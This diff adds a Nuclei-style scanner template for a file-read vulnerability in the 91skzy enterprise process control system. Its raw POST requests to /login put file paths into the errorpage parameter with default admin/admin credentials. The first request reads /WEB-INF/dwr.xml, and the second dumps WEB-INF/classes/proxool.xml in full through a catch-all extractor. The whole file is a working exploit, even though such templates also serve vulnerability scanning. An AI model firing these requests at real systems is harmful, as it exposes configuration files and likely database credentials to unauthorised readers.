@@ -1,0 +1,57 @@
+id: 91skzy-file-read
+
+info:
+  name: 91skzy Enterprise Process Control System File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Spatiotemporal Zhiyou enterprise process control system login file read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 102
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "value=\"com.race.template.components.comment.UserAccess\"></param>"
+          - "<convert converter=\"bean\" match=\"net.jforum.entities.*\"/>"
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        op=verify%7Clogin&targetpage=&errorpage={{filePath}}&mark=&tzo=480&username=admin&password=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "([\\s\\S]+)"
+        group: 1
+variables:
+  filePath: "WEB-INF/classes/proxool.xml"
